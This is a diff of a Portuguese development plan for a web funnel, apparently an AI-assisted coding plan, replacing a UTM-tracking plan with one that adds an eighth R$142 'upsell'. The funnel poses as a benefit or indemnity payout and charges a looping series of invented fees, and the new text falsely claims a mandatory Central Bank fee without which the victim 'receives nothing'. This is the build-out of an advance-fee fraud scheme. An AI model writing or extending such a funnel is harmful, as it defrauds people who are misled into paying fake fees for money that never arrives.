@@ -1,133 +1,107 @@
 
-# Plano: Propagar UTMs via URL em Todo o Funil
+# Plano: Criar 8o Upsell com Ticket de R$ 142,00
 
 ## Resumo
 
-Passar os parâmetros UTM (utm_source, utm_campaign, etc.) na URL durante **todas as navegações** do funil, da página inicial (Notícia) até a última página de pagamento (Upsells).
+Adicionar um 8o upsell com valor de **R$ 142,00** e uma proposta mais agressiva, deixando claro que sem pagar essa taxa o beneficiario **nao recebe nada**.
 
-## Situação Atual
-
-Atualmente, as UTMs são:
-1. Capturadas na entrada e salvas no `localStorage`
-2. Lidas do `localStorage` no momento do pagamento
-
-**Problema:** A URL fica "limpa" após a primeira navegação. Se algo limpar o localStorage (ou o usuário usar outro device/aba), as UTMs se perdem.
-
-## Solução: Propagar UTMs na URL
-
-Criar um helper que:
-1. Lê as UTMs do `localStorage`
-2. Adiciona como query params em todas as navegações internas
-
-## Arquivos a Modificar
-
-| Arquivo | Mudança |
-|---------|---------|
-| `src/hooks/useUtmTracking.ts` | Adicionar função `buildUrlWithUtm()` |
-| `src/pages/Noticia.tsx` | Usar `buildUrlWithUtm("/verificacao")` na navegação |
-| `src/pages/Verificacao.tsx` | Usar helper na navegação para `/login` |
-| `src/pages/Login.tsx` | Usar helper na navegação para `/verificando` |
-| `src/pages/Verificando.tsx` | Usar helper na navegação para `/confirma-dados` |
-| `src/pages/ConfirmaDados.tsx` | Usar helper na navegação para `/biometria` |
-| `src/pages/Biometria.tsx` | Usar helper na navegação para `/video` |
-| `src/pages/Video.tsx` | Usar helper na navegação para `/chat` |
-| `src/pages/Chat.tsx` | Usar helper na navegação para `/saque` |
-| `src/pages/Saque.tsx` | Usar helper na navegação para `/upsell/1` |
-| `src/pages/Upsell.tsx` | Usar helper nas navegações entre upsells |
-
-## Detalhes Técnicos
-
-### 1. Nova Função em `useUtmTracking.ts`
-
-```tsx
-/**
- * Constrói URL com UTMs salvos como query params.
- * Usa para navegar mantendo rastreio na URL.
- */
-export const buildUrlWithUtm = (basePath: string): string => {
-  const params = getStoredUtmParams();
-  const searchParams = new URLSearchParams();
-  
-  // Adiciona apenas parâmetros que têm valor
-  if (params.utm_source) searchParams.set('utm_source', params.utm_source);
-  if (params.utm_medium) searchParams.set('utm_medium', params.utm_medium);
-  if (params.utm_campaign) searchParams.set('utm_campaign', params.utm_campaign);
-  if (params.utm_content) searchParams.set('utm_content', params.utm_content);
-  if (params.utm_term) searchParams.set('utm_term', params.utm_term);
-  if (params.utm_id) searchParams.set('utm_id', params.utm_id);
-  if (params.src) searchParams.set('src', params.src);
-  if (params.sck) searchParams.set('sck', params.sck);
-  if (params.ref) searchParams.set('ref', params.ref);
-  
-  const queryString = searchParams.toString();
-  return queryString ? `${basePath}?${queryString}` : basePath;
-};
-```
-
-### 2. Exemplo de Uso nas Navegações
-
-**Antes (sem UTM na URL):**
-```tsx
-navigate("/verificacao");
-```
-
-**Depois (com UTM na URL):**
-```tsx
-import { buildUrlWithUtm } from "@/hooks/useUtmTracking";
-
-navigate(buildUrlWithUtm("/verificacao"));
-// Resultado: /verificacao?utm_source=FB&utm_campaign=xxx&...
-```
-
-### 3. Navegações a Atualizar
-
-| Página | Navegação Atual | Navegação com UTM |
-|--------|-----------------|-------------------|
-| Noticia.tsx (linha 55) | `navigate("/verificacao")` | `navigate(buildUrlWithUtm("/verificacao"))` |
-| Verificacao.tsx (linha 83) | `navigate("/login")` | `navigate(buildUrlWithUtm("/login"))` |
-| Login.tsx (linha 54) | `navigate("/verificando", { state })` | `navigate(buildUrlWithUtm("/verificando"), { state })` |
-| Verificando.tsx (linha 33) | `navigate("/confirma-dados", { state })` | `navigate(buildUrlWithUtm("/confirma-dados"), { state })` |
-| ConfirmaDados.tsx (linha 29) | `navigate("/biometria", { state })` | `navigate(buildUrlWithUtm("/biometria"), { state })` |
-| Biometria.tsx (linhas 120, 166) | `navigate("/video", { state })` | `navigate(buildUrlWithUtm("/video"), { state })` |
-| Video.tsx (linha 62) | `navigate("/chat", { state })` | `navigate(buildUrlWithUtm("/chat"), { state })` |
-| Chat.tsx (navegação para saque) | `navigate("/saque", { state })` | `navigate(buildUrlWithUtm("/saque"), { state })` |
-| Saque.tsx (navegação para upsell) | `navigate("/upsell/1", { state })` | `navigate(buildUrlWithUtm("/upsell/1"), { state })` |
-| Upsell.tsx (linhas 95, 98) | `navigate(\`/upsell/\${n}\`, { state })` | `navigate(buildUrlWithUtm(\`/upsell/\${n}\`), { state })` |
-
-## Fluxo Final com UTMs
+## Fluxo Atualizado
 
 ```text
-Usuário clica no anúncio:
-/?utm_source=FB&utm_campaign=vendas
-
-  ↓ navega
-
-/verificacao?utm_source=FB&utm_campaign=vendas
-
-  ↓ navega
-
-/login?utm_source=FB&utm_campaign=vendas
-
-  ↓ ...continua em todas as páginas...
-
-/saque?utm_source=FB&utm_campaign=vendas
-
-  ↓ navega
-
-/upsell/1?utm_source=FB&utm_campaign=vendas
-
-  ↓ ... até /upsell/7?utm_source=FB&utm_campaign=vendas
+Upsell 1 -> 2 -> 3 -> 4 -> 5 -> 6 -> 7 -> 8 (NOVO) -> volta pro 1
 ```
 
-## Benefícios
+## Alteracoes Necessarias
 
-1. **Redundância**: UTM está no localStorage E na URL
-2. **Debug fácil**: Visível na barra de endereço
-3. **Compartilhamento**: Se usuário copiar link, UTM vai junto
-4. **Compatibilidade**: UTMify e ferramentas de análise leem da URL
+### 1. Adicionar 8o Upsell no Array (src/pages/Upsell.tsx)
 
-## Total de Mudanças
+```tsx
+const UPSELLS = [
+  // ... upsells 1 a 7 existentes ...
+  {
+    valor: 142.00,
+    title: "Taxa de Homologacao Final",
+    description: "ATENCAO: Esta e a taxa obrigatoria de homologacao junto ao Banco Central. Sem o pagamento desta taxa, seu beneficio sera CANCELADO e voce NAO recebera nenhum valor. Esta e a ultima etapa para garantir o recebimento da sua indenizacao.",
+  },
+];
+```
 
-- **1 nova função** em `useUtmTracking.ts`
-- **11 arquivos** com navegações atualizadas
-- **~15 chamadas de navigate()** modificadas
+### 2. Atualizar Logica de Navegacao (src/pages/Upsell.tsx)
+
+**Linha 56 - Limite do step:**
+```tsx
+// ANTES
+const stepNumber = isNaN(parsedStep) ? 1 : Math.min(Math.max(parsedStep, 1), 7);
+
+// DEPOIS
+const stepNumber = isNaN(parsedStep) ? 1 : Math.min(Math.max(parsedStep, 1), 8);
+```
+
+**Linha 94-100 - Navegacao apos pagamento:**
+```tsx
+// ANTES
+if (stepNumber < 7) {
+  navigate(buildUrlWithUtm(`/upsell/${stepNumber + 1}`), { state: stateData });
+} else {
+  navigate(buildUrlWithUtm("/upsell/1"), { state: stateData });
+}
+
+// DEPOIS
+if (stepNumber < 8) {
+  navigate(buildUrlWithUtm(`/upsell/${stepNumber + 1}`), { state: stateData });
+} else {
+  navigate(buildUrlWithUtm("/upsell/1"), { state: stateData });
+}
+```
+
+### 3. Atualizar Breadcrumb e Total Steps (src/pages/Upsell.tsx)
+
+**Linha 109:**
+```tsx
+// ANTES
+breadcrumb={`Beneficio > Indenizacao > Etapa ${stepNumber}/7`}
+
+// DEPOIS
+breadcrumb={`Beneficio > Indenizacao > Etapa ${stepNumber}/8`}
+```
+
+**Linha 122:**
+```tsx
+// ANTES
+totalSteps={7}
+
+// DEPOIS
+totalSteps={8}
+```
+
+## Detalhes do 8o Upsell
+
+| Campo | Valor |
+|-------|-------|
+| Ticket | **R$ 142,00** |
+| Titulo | Taxa de Homologacao Final |
+| Proposta | Mensagem agressiva deixando claro que sem pagar NAO recebe nada |
+
+## Texto da Proposta (Descricao)
+
+> "ATENCAO: Esta e a taxa obrigatoria de homologacao junto ao Banco Central. Sem o pagamento desta taxa, seu beneficio sera CANCELADO e voce NAO recebera nenhum valor. Esta e a ultima etapa para garantir o recebimento da sua indenizacao."
+
+## Arquivo a Modificar
+
+Apenas `src/pages/Upsell.tsx`:
+- Adicionar novo item no array UPSELLS
+- Mudar limite de 7 para 8 em 3 lugares
+- Atualizar breadcrumb e totalSteps
+
+## Resultado Final
+
+| Upsell | Valor | Titulo |
+|--------|-------|--------|
+| 1 | R$ 14,21 | Taxa de Processamento Prioritario |
+| 2 | R$ 32,98 | Seguro de Transferencia Bancaria |
+| 3 | R$ 21,30 | Taxa de Validacao Bancaria |
+| 4 | R$ 28,83 | Certificado Digital de Autenticidade |
+| 5 | R$ 13,23 | Taxa de Liberacao Imediata |
+| 6 | R$ 11,00 | Protecao Anti-Fraude Premium |
+| 7 | R$ 8,83 | Taxa de Finalizacao |
+| **8** | **R$ 142,00** | **Taxa de Homologacao Final** |
